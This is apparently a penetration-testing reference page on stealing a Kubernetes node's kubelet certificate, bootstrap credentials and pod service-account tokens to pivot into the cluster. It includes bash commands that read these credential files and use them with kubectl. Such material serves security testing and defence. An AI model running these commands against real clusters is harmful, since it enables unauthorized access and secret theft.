---
title: "Kubelet credential theft: stealing the node identity to pivot to the cluster"
description: "Each node's kubelet authenticates to the API server with a client certificate and holds the bootstrap and node credentials on disk. An attacker who reaches the node filesystem steals the kubelet client certificate and the projected tokens of every pod on the node, pivoting from node root to broad cluster access through the node's own identity and its pods' identities."
keywords:
  - kubelet
  - node credentials
  - client certificate
  - bootstrap token
  - cluster pivot
---

# Kubelet credential theft

Owning a node is not the end goal; the node's credentials are the pivot to the cluster. The kubelet authenticates to the API server with a client certificate stored on the node, the node may hold a bootstrap token used to join, and every pod scheduled to the node has its projected service-account token on disk. Harvesting these turns node root into the node's own cluster identity plus the identities of all its pods.

Collect the credentials from the node filesystem:

```bash
# kubelet client certificate and key (the node's API identity)
ls -l /var/lib/kubelet/pki/
cat /var/lib/kubelet/pki/kubelet-client-current.pem      # cert+key, system:node:<name>
# the kubelet kubeconfig points at the API server and this cert
cat /etc/kubernetes/kubelet.conf 2>/dev/null
# bootstrap credentials, if the node still has them
cat /etc/kubernetes/bootstrap-kubelet.conf 2>/dev/null
# every pod's projected service-account token on this node
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
```

## Using the node identity

```bash
# authenticate as the node (system:node:<name>, in the system:nodes group)
kubectl --client-certificate=kubelet-client-current.pem \
  --client-key=kubelet-client-current.pem \
  --server=https://<apiserver>:6443 --insecure-skip-tls-verify get nodes
# the Node authorizer lets a node read the secrets and configmaps of pods
# scheduled to it; enumerate those, then use the richest pod token found
```

The node identity is scoped by the Node authorization mode to resources tied to its own pods, but that already includes those pods' secrets; a pod token belonging to a powerful service account escalates further.

## Exploitation notes

- The kubelet client certificate authenticates as `system:node:<name>` in the `system:nodes` group; the Node authorizer grants it read of the secrets and configmaps of pods bound to that node, which is a broad secret harvest.
- Projected pod tokens on the node are often the bigger prize: a controller or system pod scheduled there carries a service account with wide RBAC; decode each and test it per [Service account token to API](../lateral-movement/service-account-token-to-api.md).
- A bootstrap token, if present, can enroll attacker-controlled nodes or be reused depending on cluster configuration; treat it as a durable credential.

## References

- [Kubernetes: node authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/)
- [Kubernetes: kubelet TLS bootstrapping](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-tls-bootstrapping/)
- [HackTricks: Kubernetes node pivot](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
